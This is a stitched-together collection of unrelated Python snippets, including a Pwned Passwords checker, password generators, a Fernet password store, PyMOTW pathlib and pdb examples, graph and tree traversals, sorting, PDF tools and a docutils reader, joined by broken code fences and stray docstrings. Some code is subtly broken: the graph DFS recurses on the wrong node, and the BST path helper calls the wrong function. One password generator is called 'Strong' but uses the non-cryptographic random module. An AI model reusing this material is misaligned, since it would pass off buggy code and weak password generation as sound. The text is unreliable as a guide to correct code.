# passwordCheck = lambda s: (any(i.isdigit()) and any(i.islower()) and any(i.isupper())) for i in s and len(s) > 4

# Regex:

# def passwordCheck(s):
#    return len(s) > 4 and all(re.search(p, s) for p in ('[A-Z]', '\d', '[a-z]'))

passwordCheck = lambda s: len(s) > 4 and all(
    re.search(i, s) for i in ("[A-Z]", "\d", "[a-z]")
)


import requests
import hashlib
import sys



def request_api_data(query_char):
  '''requests our data and gives us a response'''
  url = 'https://api.pwnedpasswords.com/range/' + query_char
  res = requests.get(url)
  if res.status_code != 200:    #check our response if the status is 200
    raise RuntimeError(f'Error fetching: {res.status_code}, check the api and try again')
  return res

def get_password_leaks_count(hashes, hash_to_check):
  '''loop through all the hashes for checking the parameter 'hash_to_check' and returns the count '''
  hashes = (line.split(':') for line in hashes.text.splitlines())
  for h, count in hashes:
    if h == hash_to_check:
      return count
  return 0

def pwned_api_check(password):
  '''check password if it exists in API'''
  sha1password = hashlib.sha1(password.encode('utf-8')).hexdigest().upper()   #hashing the password using SHA-1 algorithm and returning query char
  first5_char, tail = sha1password[:5], sha1password[5:]
  response = request_api_data(first5_char)
  return get_password_leaks_count(response, tail)

def main(args):
  '''recieves the arguments that we give in command line'''
  for password in args:
    count = pwned_api_check(password)
    if count:
      print(f'{password} was found {count} times... you should probably change your password!')
    else:
      print(f'{password} was NOT found. Carry on!')
  return '!!!-----Done----!!!'

if __name__ == '__main__':
  sys.exit(main(sys.argv[1:]))    #exiting out of the file

````

````py
Why to create strong password?
Because it makes the chances of hackers bruteforcing your password to almost 0%
Simply to not get hacked!```


```py

import random
import string

# Password level is Strong!
# Creates a alphanumeric password of `n` chars
def create_password(n):
    allChars = (
        list(string.ascii_letters) + list(string.digits) + list(string.punctuation)
    )
    passphrase = []
    for i in range(n):
        tmp = random.choice(allChars)
        passphrase.append(tmp)

    res = "".join(passphrase)
    return res


# Test 1
test1 = create_password(16)
print(test1)

# Test 2
test2 = create_password(32)
print(test2)

from __future__ import print_function
import string
import random

letters = [letter for letter in string.ascii_letters]
digits = [digit for digit in string.digits]
symbols = [symbol for symbol in string.punctuation]
chars = letters + digits + symbols
random.shuffle(chars)

min_length = 8
max_length = 16
password = ''.join(random.choice(chars) for x in range(random.randint(min_length, max_length)))
print('Password: ' + password)
print('[ If you are thinking of using this passsword, You better save it. ]')


# ALTERNATIVE METHODS
# ctbi= characters that must be in password
# i= how many letters or characters the password length will be
def password_generator(ctbi, i):
  # Password generator = full boot with random_number, random_letters, and random_character FUNCTIONS
  pass  # Put your code here...


def random_number(ctbi, i):
  pass  # Put your code here...


def random_letters(ctbi, i):
  pass  # Put your code here...


def random_characters(ctbi, i):
  pass  # Put your code here...

from cryptography.fernet import Fernet


def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def load_key():
    file = open("key.key", "rb")
    key = file.read()
    file.close()
    return key


key = load_key()
fer = Fernet(key)


def view():
    with open('passwords.txt', 'r') as f:
        for line in f.readlines():
            data = line.rstrip()
            user, passw = data.split("|")
            print("User:", user, "| Password:",
                  fer.decrypt(passw.encode()).decode())


def add():
    name = input('Account Name: ')
    pwd = input("Password: ")

    with open('passwords.txt', 'a') as f:
        f.write(name + "|" + fer.encrypt(pwd.encode()).decode() + "\n")


while True:
    mode = input(
        "Would you like to add a new password or view existing ones (view, add), press q to quit? ").lower()
    if mode == "q":
        break

    if mode == "view":
        view()
    elif mode == "add":
        add()
    else:
        print("Invalid mode.")
        continue```


```py
    pygments.styles.pastie
    ~~~~~~~~~~~~~~~~~~~~~~

    Style similar to the `pastie`_ default style.

    .. _pastie: http://pastie.caboo.se/

    :copyright: Copyright 2006-2021 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.```


```py

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class PastieStyle(Style):
    """
    Style similar to the pastie default style.
    """

    default_style = ''

    styles = {
        Whitespace:             '#bbbbbb',
        Comment:                '#888888',
        Comment.Preproc:        'bold #cc0000',
        Comment.Special:        'bg:#fff0f0 bold #cc0000',

        String:                 'bg:#fff0f0 #dd2200',
        String.Regex:           'bg:#fff0ff #008800',
        String.Other:           'bg:#f0fff0 #22bb22',
        String.Symbol:          '#aa6600',
        String.Interpol:        '#3333bb',
        String.Escape:          '#0044dd',

        Operator.Word:          '#008800',

        Keyword:                'bold #008800',
        Keyword.Pseudo:         'nobold',
        Keyword.Type:           '#888888',

        Name.Class:             'bold #bb0066',
        Name.Exception:         'bold #bb0066',
        Name.Function:          'bold #0066bb',
        Name.Property:          'bold #336699',
        Name.Namespace:         'bold #bb0066',
        Name.Builtin:           '#003388',
        Name.Variable:          '#336699',
        Name.Variable.Class:    '#336699',
        Name.Variable.Instance: '#3333bb',
        Name.Variable.Global:   '#dd7700',
        Name.Constant:          'bold #003366',
        Name.Tag:               'bold #bb0066',
        Name.Attribute:         '#336699',
        Name.Decorator:         '#555555',
        Name.Label:             'italic #336699',

        Number:                 'bold #0000DD',

        Generic.Heading:        '#333',
        Generic.Subheading:     '#666',
        Generic.Deleted:        'bg:#ffdddd #000000',
        Generic.Inserted:       'bg:#ddffdd #000000',
        Generic.Error:          '#aa0000',
        Generic.Emph:           'italic',
        Generic.Strong:         'bold',
        Generic.Prompt:         '#555555',
        Generic.Output:         '#888888',
        Generic.Traceback:      '#aa0000',

        Error:                  'bg:#e3d2d2 #a61717'
    }

from collections import defaultdict


class Graph:
    def __init__(self, v):
        self.v = v
        self.graph = defaultdict(list)
        self.has_path = False

    def add_edge(self, u, v):
        self.graph[u].append(v)

    def dfs(self, x, y):
        visited = [False] * self.v
        self.dfsutil(visited, x, y)

    def dfsutil(self, visited, x, y):
        visited[x] = True
        for i in self.graph[x]:
            if y in self.graph[x]:
                self.has_path = True
                return
            if not (visited[i]):
                self.dfsutil(visited, x, i)

    def is_reachable(self, x, y):
        self.has_path = False
        self.dfs(x, y)
        return self.has_path


# Create a graph given in the above diagram
g = Graph(4)
g.add_edge(0, 1)
g.add_edge(0, 2)
g.add_edge(1, 2)
g.add_edge(2, 0)
g.add_edge(2, 3)
g.add_edge(3, 3)

u = 1
v = 3

if g.is_reachable(u, v):
    print("There is a path from %d to %d" % (u, v))
else:
    print("There is no path from %d to %d" % (u, v))

u = 3
v = 1
if g.is_reachable(u, v):
    print("There is a path from %d to %d" % (u, v))
else:
    print("There is no path from %d to %d" % (u, v))

import tree


class KnightPathFinder:
    def __init__(self, coords):
        self._coords = coords
        self._root = tree.Node(coords)
        # cannot call set constructor with a tuple?
        self._considered_positions = {coords}

    def get_valid_moves(self, pos):
        # valid_moves = range(0, 8, 1)
        # pos[0] = x, pos[1] = y
        valid_moves = [
            (pos[0] + 2, pos[1] + 1),
            (pos[0] + 2, pos[1] - 1),
            (pos[0] + 1, pos[1] + 2),
            (pos[0] - 1, pos[1] + 2),
            (pos[0] - 2, pos[1] + 1),
            (pos[0] - 2, pos[1] - 1),
            (pos[0] + 1, pos[1] - 2),
            (pos[0] - 1, pos[1] - 2),
        ]

        # lst = [(x + new_x,y + new_y) for (x,y) in valid if]

        return set(
            filter(
                lambda move: move[0] in range(8) and move[1] in range(8), valid_moves
            )
        )

    def new_move_positions(self, pos):
        # self._considered_positions.remove(pos)
        new_positions = self.get_valid_moves(pos) - self._considered_positions
        self._considered_positions = self._considered_positions | self.get_valid_moves(
            pos
        )

        return new_positions

    @property
    def considered_positions(self):
        return self._considered_positions

    def build_move_tree(self):
        queue = [self.new_move_positions(self._root.value), self._root]

        while len(queue) > 0:
            pos = queue.pop(0)
            parent = queue.pop(0)
            for move in pos:
                newNode = tree.Node(move)
                queue.append(self.new_move_positions(move))
                queue.append(newNode)
                parent.add_child(newNode)

    def find_path(self, end_position):
        final_node = self._root.depth_search(end_position)
        return self.trace_to_root(final_node)

    def trace_to_root(self, end_node):
        current_node = end_node
        node_list = [end_node.value]
        while current_node != self._root:
            node_list.append(current_node.parent.value)
            current_node = current_node.parent
        node_list.reverse()
        return node_list


test_coords = (-1, -1)
xander = KnightPathFinder(test_coords)
xander.new_move_positions(test_coords)

finder = KnightPathFinder((0, 0))
finder.build_move_tree()
# print(finder._root.children[0].children)

finder = KnightPathFinder((0, 0))
finder.build_move_tree()
print(finder.find_path((7, 6)))  # => [(0, 0), (2, 1)]

# finder = KnightPathFinder((0, 0))
# print(finder.new_move_positions((0, 0)))

from distutils.unixccompiler import UnixCCompiler

class PathScaleCCompiler(UnixCCompiler):

    """
    PathScale compiler compatible with an gcc built Python.
    """

    compiler_type = 'pathcc'
    cc_exe = 'pathcc'
    cxx_exe = 'pathCC'

    def __init__ (self, verbose=0, dry_run=0, force=0):
        UnixCCompiler.__init__ (self, verbose, dry_run, force)
        cc_compiler = self.cc_exe
        cxx_compiler = self.cxx_exe
        self.set_executables(compiler=cc_compiler,
                             compiler_so=cc_compiler,
                             compiler_cxx=cxx_compiler,
                             linker_exe=cc_compiler,
                             linker_so=cc_compiler + ' -shared')

from numpy.distutils.fcompiler import FCompiler

compilers = ['PathScaleFCompiler']

class PathScaleFCompiler(FCompiler):

    compiler_type = 'pathf95'
    description = 'PathScale Fortran Compiler'
    version_pattern =  r'PathScale\(TM\) Compiler Suite: Version (?P<version>[\d.]+)'

    executables = {
        'version_cmd'  : ["pathf95", "-version"],
        'compiler_f77' : ["pathf95", "-fixedform"],
        'compiler_fix' : ["pathf95", "-fixedform"],
        'compiler_f90' : ["pathf95"],
        'linker_so'    : ["pathf95", "-shared"],
        'archiver'     : ["ar", "-cr"],
        'ranlib'       : ["ranlib"]
    }
    pic_flags = ['-fPIC']
    module_dir_switch = '-module ' # Don't remove ending space!
    module_include_switch = '-I'

    def get_flags_opt(self):
        return ['-O3']
    def get_flags_debug(self):
        return ['-g']

if __name__ == '__main__':
    from distutils import log
    log.set_verbosity(2)
    from numpy.distutils import customized_fcompiler
    print(customized_fcompiler(compiler='pathf95').get_version())

#!/usr/bin/env python3```


```pyChange permissions on a file```


```py

#end_pymotw_header
import os
import pathlib
import stat

# Create a fresh test file.
f = pathlib.Path('pathlib_chmod_example.txt')
if f.exists():
    f.unlink()
f.write_text('contents')

# Determine what permissions are already set using stat.
existing_permissions = stat.S_IMODE(f.stat().st_mode)
print('Before: {:o}'.format(existing_permissions))

# Decide which way to toggle them.
if not (existing_permissions & os.X_OK):
    print('Adding execute permission')
    new_permissions = existing_permissions | stat.S_IXUSR
else:
    print('Removing execute permission')
    # use xor to remove the user execute permission
    new_permissions = existing_permissions ^ stat.S_IXUSR

# Make the change and show the new value.
f.chmod(new_permissions)
after_permissions = stat.S_IMODE(f.stat().st_mode)
print('After: {:o}'.format(after_permissions))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyConvenience methods for Path```


```py

#end_pymotw_header
import pathlib

home = pathlib.Path.home()
print('home: ', home)

cwd = pathlib.Path.cwd()
print('cwd : ', cwd)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyBuilding a new path from an existing path```


```py

#end_pymotw_header
import pathlib

ind = pathlib.PurePosixPath('source/pathlib/index.rst')
print(ind)

py = ind.with_name('pathlib_from_existing.py')
print(py)

pyc = py.with_suffix('.pyc')
print(pyc)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pypathlib glob```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path('..')

for f in p.glob('*.rst'):
    print(f)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pypathlib iterdir```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path('.')

for f in p.iterdir():
    print(f)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyBuilding paths with joinpath```


```py

#end_pymotw_header
import pathlib

root = pathlib.PurePosixPath('/')
subdirs = ['usr', 'local']
usr_local = root.joinpath(*subdirs)
print(usr_local)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyCreating a directory```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path('example_dir')

print('Creating {}'.format(p))
p.mkdir()

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyParsing paths```


```py

#end_pymotw_header
import pathlib

p = pathlib.PurePosixPath('./source/pathlib/pathlib_name.py')
print('path  : {}'.format(p))
print('name  : {}'.format(p.name))
print('suffix: {}'.format(p.suffix))
print('stem  : {}'.format(p.stem))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyBuilding paths with the operator```


```py

#end_pymotw_header
import pathlib

usr = pathlib.PurePosixPath('/usr')
print(usr)

usr_local = usr / 'local'
print(usr_local)

usr_share = usr / pathlib.PurePosixPath('share')
print(usr_share)

root = usr / '..'
print(root)

etc = root / '/etc/'
print(etc)

#!/usr/bin/env python3```


```pyShow stat info for a file.```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path(__file__)

print('{} is owned by {}/{}'.format(p, p.owner(), p.group()))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyParsing paths```


```py

#end_pymotw_header
import pathlib

p = pathlib.PurePosixPath('/usr/local/lib')

print('parent: {}'.format(p.parent))

print('\nhierarchy:')
for up in p.parents:
    print(up)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyParsing paths```


```py

#end_pymotw_header
import pathlib

p = pathlib.PurePosixPath('/usr/local')
print(p.parts)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyRead and writing files```


```py

#end_pymotw_header
import pathlib

f = pathlib.Path('example.txt')

f.write_bytes('This is the content'.encode('utf-8'))

with f.open('r', encoding='utf-8') as handle:
    print('read from open(): {!r}'.format(handle.read()))

print('read_text(): {!r}'.format(f.read_text('utf-8')))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyResolving relative paths```


```py

#end_pymotw_header
import pathlib

usr_local = pathlib.Path('/usr/local')
share = usr_local / '..' / 'share'
print(share.resolve())

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pypathlib rglob```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path('..')

for f in p.rglob('pathlib_*.py'):
    print(f)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyCreating a directory```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path('example_dir')

print('Removing {}'.format(p))
p.rmdir()

#!/usr/bin/env python3```


```pyShow stat info for a file.```


```py

#end_pymotw_header
import pathlib
import sys
import time

if len(sys.argv) == 1:
    filename = __file__
else:
    filename = sys.argv[1]

p = pathlib.Path(filename)
stat_info = p.stat()

print('{}:'.format(filename))
print('  Size:', stat_info.st_size)
print('  Permissions:', oct(stat_info.st_mode))
print('  Owner:', stat_info.st_uid)
print('  Device:', stat_info.st_dev)
print('  Created      :', time.ctime(stat_info.st_ctime))
print('  Last modified:', time.ctime(stat_info.st_mtime))
print('  Last accessed:', time.ctime(stat_info.st_atime))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyCreating symbolic links```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path('example_link')

p.symlink_to('index.rst')

print(p)
print(p.resolve().name)

#!/usr/bin/env python3```


```pyChange modification time of a file```


```py

#end_pymotw_header
import pathlib
import time

p = pathlib.Path('touched')
if p.exists():
    print('already exists')
else:
    print('creating new')

p.touch()
start = p.stat()

time.sleep(1)

p.touch()
end = p.stat()

print('Start:', time.ctime(start.st_mtime))
print('End  :', time.ctime(end.st_mtime))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pypathlib types```


```py

#end_pymotw_header
import itertools
import os
import pathlib

root = pathlib.Path('test_files')

# Clean up from previous runs.
if root.exists():
    for f in root.iterdir():
        f.unlink()
else:
    root.mkdir()

# Create test files
(root / 'file').write_text(
    'This is a regular file', encoding='utf-8')
(root / 'symlink').symlink_to('file')
os.mkfifo(str(root / 'fifo'))

# Check the file types
to_scan = itertools.chain(
    root.iterdir(),
    [pathlib.Path('/dev/disk0'),
     pathlib.Path('/dev/console')],
)
hfmt = '{:18s}' + ('  {:>5}' * 6)
print(hfmt.format('Name', 'File', 'Dir', 'Link', 'FIFO', 'Block',
                  'Character'))
print()

fmt = '{:20s}  ' + ('{!r:>5}  ' * 6)
for f in to_scan:
    print(fmt.format(
        str(f),
        f.is_file(),
        f.is_dir(),
        f.is_symlink(),
        f.is_fifo(),
        f.is_block_device(),
        f.is_char_device(),
    ))

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyRemoving files```


```py

#end_pymotw_header
import pathlib

p = pathlib.Path('touched')

p.touch()

print('exists before removing:', p.exists())

p.unlink()

print('exists after removing:', p.exists())

class BSTNode:
    def __init__(self, value):
        self.value = value
        self.left = None
        self.right = None

    def insert(self, value):
        if value <= self.value:
            # the new value must go left
            if self.left is None:
                # create a new node as a left child of the current node
                self.left = BSTNode(value)
            else:
                self.left.insert(value)

        else:
            # the value must go right
            if self.right is None:
                # create a new node as a right child of the current node
                self.right = BSTNode(value)
            else:
                self.right.insert(value)


def get_paths_root(root, array):  # in pre order
    paths_array = []

    def print_paths(root, path):  # helper function to get to every node
        new_path = path + [root.value]
        print(new_path)
        # if you can go left, recurse left
        if not root.left and not root.right:
            paths_array.append(new_path)

        if root.left:
            get_paths_root(root.left, new_path.copy())

        if root.right:
            get_paths_root(root.right, new_path.copy())

    print_paths(root, [])
    return paths_array


def depth_first_traversal(root):
    # non recursive

    paths_array = []
    stack = []  # setup
    stack.append((root, []))  # pass a tuple
    while len(stack) > 0:  # loop until items are out
        # dequeue an item
        node, path = stack.pop()  # pop

        # generate and print the path
        new_path = path + [node.value]
        print(new_path)

        if not root.left and not root.right:
            paths_array.append(new_path)

        if node.right:  # get to the next nodes
            stack.append((node.right, new_path.copy()))
        if (
            node.left
        ):  # tures into an preorder traversal cause the left side is preoritized in the call stack
            stack.append((node.left, new_path.copy()))

    return paths_array


def beadth_first_traversal(root):
    # non recursive and using a queue

    paths_array = []
    queue = []  # setup
    queue.append((root, []))  # pass a tuple
    while len(queue) > 0:  # loop until items are out
        # dequeue an item
        node, path = queue.pop(0)  # pop

        # generate and print the path
        new_path = path + [node.value]
        print(new_path)

        if not root.left and not root.right:
            paths_array.append(new_path)

        if node.right:  # get to the next nodes
            queue.append((node.right, new_path.copy()))
        if (
            node.left
        ):  # tures into an preorder traversal cause the left side is preoritized in the call stack
            queue.append((node.left, new_path.copy()))

    return paths_array


root = BSTNode(8)
root.insert(5)
root.insert(4)
root.insert(7)
root.insert(12)
root.insert(11)
root.insert(13)

depth_first_traversal(root)

from bisect import bisect_left
from functools import total_ordering
from heapq import merge
from typing import List
````

````py
A pure Python implementation of the patience sort algorithm

For more information: https://en.wikipedia.org/wiki/Patience_sorting

This algorithm is based on the card game patience

For doctests run following command:
python3 -m doctest -v patience_sort.py

For manual testing run:
python3 patience_sort.py```


```py


@total_ordering
class Stack(list):
    def __lt__(self, other):
        return self[-1] < other[-1]

    def __eq__(self, other):
        return self[-1] == other[-1]


def patience_sort(collection: list) -> list:
    """A pure implementation of quick sort algorithm in Python

    :param collection: some mutable ordered collection with heterogeneous
    comparable items inside
    :return: the same collection ordered by ascending

    Examples:
    >>> patience_sort([1, 9, 5, 21, 17, 6])
    [1, 5, 6, 9, 17, 21]

    >>> patience_sort([])
    []

    >>> patience_sort([-3, -17, -48])
    [-48, -17, -3]
    """
    stacks: List[Stack] = []
    # sort into stacks
    for element in collection:
        new_stacks = Stack([element])
        i = bisect_left(stacks, new_stacks)
        if i != len(stacks):
            stacks[i].append(element)
        else:
            stacks.append(new_stacks)

    # use a heap-based merge to merge stack efficiently
    collection[:] = merge(*[reversed(stack) for stack in stacks])
    return collection


if __name__ == "__main__":
    user_input = input("Enter numbers separated by a comma:\n").strip()
    unsorted = [int(item) for item in user_input.split(",")]
    print(patience_sort(unsorted))
````

````pyWrite a program to prompt the user for hours and rate per hour using input to compute gross pay.
Pay the hourly rate for the hours up to 40 and 1.5 times the hourly rate for all hours worked above 40 hours.
Use 45 hours and a rate of 10.50 per hour to test the program (the pay should be 498.75).
You should use input to read a string and float() to convert the string to a number.
Do not worry about error checking the user input - assume the user types numbers properly```


```py


def compute_payment(hour):

    # payment for the 1st 40 hrs
    rate = 10.50
    pay_base = rate * 40

    # payment for the 1st 40 hrs
    if hour <= 40:
        return pay_base

    # payment for extra hrs
    else:
        extra_hrs = hour - 40
        rate = rate * 1.5
        pay_succeeding = rate * extra_hrs
        total_payment = pay_base + pay_succeeding

        return total_payment


hrs = float(input("Enter Hours: "))
print(compute_payment(hrs))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#


def calc(i, n):
    j = i * n
    print('j =', j)
    if j > 0:
        print('Positive!')
    return j


def f(n):
    for i in range(n):
        print('i =', i)
        j = calc(i, n)  # noqa
    return

if __name__ == '__main__':
    f(5)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#

import pdb


def recursive_function(n=5, output='to be printed'):
    if n > 0:
        recursive_function(n - 1)
    else:
        pdb.set_trace()
        print(output)
    return

if __name__ == '__main__':
    recursive_function()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#

import pdb


def f():
    l = ['a', 'b']
    m = 9
    n = 5
    print(l, m, n)

if __name__ == '__main__':
    f()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#


def f(n):
    result = []
    j = 0
    for i in range(n):
        j = i * n + j
        j += n
        result.append(j)
    return result

if __name__ == '__main__':
    print(f(5))

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#

import pdb


def calc(i, n):
    j = i * n
    return j


def f(n):
    for i in range(n):
        j = calc(i, n)
        print(i, j)
    return

if __name__ == '__main__':
    pdb.set_trace()
    f(5)

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#


def f(n):
    if n < 0:
        raise ValueError('Invalid n: {}'.format(n))
    result = []
    j = 0
    for i in range(n):
        j = i * n + j
        j += n
        result.append(j)
    return result


if __name__ == '__main__':
    try:
        print(f(5))
    finally:
        print('Always printed')

    try:
        print(f(-5))
    except:
        print('There was an error')
    else:
        print('There was no error')

    print('Last statement')

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#


class MyObj:

    def __init__(self, num_loops):
        self.count = num_loops

    def go(self):
        for i in range(self.num_loops):
            print(i)
        return

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#

import pdb

with open('lorem.txt', 'rt') as f:
    lines = f.readlines()

pdb.set_trace()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#

import sys


def f():
    print('Command-line args:', sys.argv)
    return

if __name__ == '__main__':
    f()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#


class MyObj:

    def __init__(self, num_loops):
        self.count = num_loops

    def go(self):
        for i in range(self.count):
            print(i)
        return

if __name__ == '__main__':
    MyObj(5).go()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#

import pdb


class MyObj:

    def __init__(self, num_loops):
        self.count = num_loops

    def go(self):
        for i in range(self.count):
            pdb.set_trace()
            print(i)
        return

if __name__ == '__main__':
    MyObj(5).go()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#

import pdb


def f(n):
    for i in range(n):
        j = i * n
        print(i, j)
    return

if __name__ == '__main__':
    pdb.set_trace()
    f(5)

# Import necessary libraries:
import fitz
import io
from PIL import Image

# open the desired PDF file:
pdf = fitz.open("demo.pdf") # pdf file that contains the images
# Determine number of pages in the PDF file:
pages = len(pdf)
# Iterate over each of the PDF pages:
# Index of 1st page -> 0
for i in range(pages):
    # Access the page at index 'i':
    page = pdf[i]

    # Access all image objects present in this page:
    image_list = page.getImageList()

    # Iterate through these image objects:
    for image_count, img in enumerate(image_list, start=1):

        # Access XREF of the image:
        xref = img[0]

        # Extract image information:
        img_info = pdf.extractImage(xref)

        # Extract image bytes:
        image_bytes = img_info["image"]

        # Access image extension:
        image_ext = img_info["ext"]

        # Load this image to PIL:
        image = Image.open(io.BytesIO(image_bytes))

        # To save this image:
        image.save(open(f"page{i+1}_image{image_count}.{image_ext}", "wb"))

from pdf2image import convert_from_path

title = input("Pdf files name: ")


def menu():
    global quality
    print(
        """
        Image format:
        1. Very High Resolution - 700 dpi
        2. High Resolution - 500 dpi
        3. Medium Resolution - 300 dpi
        4. Low Resolution - 100 dpi
        5. Very Low Resolution - 50 dpi
        """
    )
    while True:
        choice = input("Choose One: ")
        quality = (
            700
            if choice == "1"
            else 500
            if choice == "2"
            else 300
            if choice == "3"
            else 100
            if choice == "4"
            else 50
            if choice == "5"
            else "Wrong choice"
        )
        program()
        print("Have a Nice Code")
        quit()


def program():
    images = convert_from_path(f"{title}.pdf", quality)
    for i, image in enumerate(images):
        image.save(f"save_{i}.png")


if __name__ == "__main__":
    menu()

from PyPDF2 import PdfFileMerger
import os
#using the inbuilt function of library
merger = PdfFileMerger()
#getting all the pdfs as per name/sequence
for items in os.listdir():
    #checking that the file selected is pdf only or not
    if items.endswith('.pdf'):
        merger.append(items)
#making the newly merged file
merger.write("new.pdf")
# python text to speech version 3
import pyttsx3
import PyPDF2

pdf = open("Andriy_Burkov.pdf", 'rb')

pdfreader = PyPDF2.PdfFileReader(pdf, strict=False)

pages = pdfreader.numPages
# print(pages) you can used this to print number of pages

myreader = pyttsx3.init()

pages = pdfreader.getPage(7)

# extract text from pages
text = pages.extractText()

myreader.say(text)

myreader.runAndWait()
````

````py
Finding the peak of a unimodal list using divide and conquer.
A unimodal array is defined as follows: array is increasing up to index p,
then decreasing afterwards. (for p >= 1)
An obvious solution can be performed in O(n),
to find the maximum of the array.
(From Kleinberg and Tardos. Algorithm Design.
Addison Wesley 2006: Chapter 5 Solved Exercise 1)```


```py
from typing import List


def peak(lst: List[int]) -> int:
    """
    Return the peak value of `lst`.
    >>> peak([1, 2, 3, 4, 5, 4, 3, 2, 1])
    5
    >>> peak([1, 10, 9, 8, 7, 6, 5, 4])
    10
    >>> peak([1, 9, 8, 7])
    9
    >>> peak([1, 2, 3, 4, 5, 6, 7, 0])
    7
    >>> peak([1, 2, 3, 4, 3, 2, 1, 0, -1, -2])
    4
    """
    # middle index
    m = len(lst) // 2

    # choose the middle 3 elements
    three = lst[m - 1 : m + 2]

    # if middle element is peak
    if three[1] > three[0] and three[1] > three[2]:
        return three[1]

    # if increasing, recurse on right
    elif three[0] < three[2]:
        if len(lst[:m]) == 2:
            m -= 1
        return peak(lst[m:])

    # decreasing
    else:
        if len(lst[:m]) == 2:
            m += 1
        return peak(lst[:m])


if __name__ == "__main__":
    import doctest

    doctest.testmod()
````

````py
Peak signal-to-noise ratio - PSNR
    https://en.wikipedia.org/wiki/Peak_signal-to-noise_ratio
Source:
https://tutorials.techonical.com/how-to-calculate-psnr-value-of-two-images-using-python```


```py

import math
import os

import cv2
import numpy as np


def psnr(original, contrast):
    mse = np.mean((original - contrast) ** 2)
    if mse == 0:
        return 100
    PIXEL_MAX = 255.0
    PSNR = 20 * math.log10(PIXEL_MAX / math.sqrt(mse))
    return PSNR


def main():
    dir_path = os.path.dirname(os.path.realpath(__file__))
    # Loading images (original image and compressed image)
    original = cv2.imread(os.path.join(dir_path, "image_data/original_image.png"))
    contrast = cv2.imread(os.path.join(dir_path, "image_data/compressed_image.png"), 1)

    original2 = cv2.imread(os.path.join(dir_path, "image_data/PSNR-example-base.png"))
    contrast2 = cv2.imread(
        os.path.join(dir_path, "image_data/PSNR-example-comp-10.jpg"), 1
    )

    # Value expected: 29.73dB
    print("-- First Test --")
    print(f"PSNR value is {psnr(original, contrast)} dB")

    # # Value expected: 31.53dB (Wikipedia Example)
    print("\n-- Second Test --")
    print(f"PSNR value is {psnr(original2, contrast2)} dB")


if __name__ == "__main__":
    main()

# $Id: pep.py 7320 2012-01-19 22:33:02Z milde $
# Author: David Goodger <goodger@python.org>
# Copyright: This module has been placed in the public domain.
````

````py
Python Enhancement Proposal (PEP) Reader.```


```py

__docformat__ = 'reStructuredText'


from docutils.readers import standalone
from docutils.transforms import peps, references, misc, frontmatter
from docutils.parsers import rst


class Reader(standalone.Reader):

    supported = ('pep',)
    """Contexts this reader supports."""

    settings_spec = (
        'PEP Reader Option Defaults',
        'The --pep-references and --rfc-references options (for the '
        'reStructuredText parser) are on by default.',
        ())

    config_section = 'pep reader'
    config_section_dependencies = ('readers', 'standalone reader')

    def get_transforms(self):
        transforms = standalone.Reader.get_transforms(self)
        # We have PEP-specific frontmatter handling.
        transforms.remove(frontmatter.DocTitle)
        transforms.remove(frontmatter.SectionSubTitle)
        transforms.remove(frontmatter.DocInfo)
        transforms.extend([peps.Headers, peps.Contents, peps.TargetNotes])
        return transforms

    settings_default_overrides = {'pep_references': 1, 'rfc_references': 1}

    inliner_class = rst.states.Inliner

    def __init__(self, parser=None, parser_name=None):
        """`parser` should be ``None``."""
        if parser is None:
            parser = rst.Parser(rfc2822=True, inliner=self.inliner_class())
        standalone.Reader.__init__(self, parser, '')

# -*- coding: utf-8 -*-
import json
import os
import platform
import sys


def format_full_version(info):
    version = "{0.major}.{0.minor}.{0.micro}".format(info)
    kind = info.releaselevel
    if kind != "final":
        version += kind[0] + str(info.serial)
    return version


# Support for 508's implementation_version.
if hasattr(sys, "implementation"):
    implementation_version = format_full_version(sys.implementation.version)
else:
    implementation_version = "0"
# Default to cpython for 2.7.
if hasattr(sys, "implementation"):
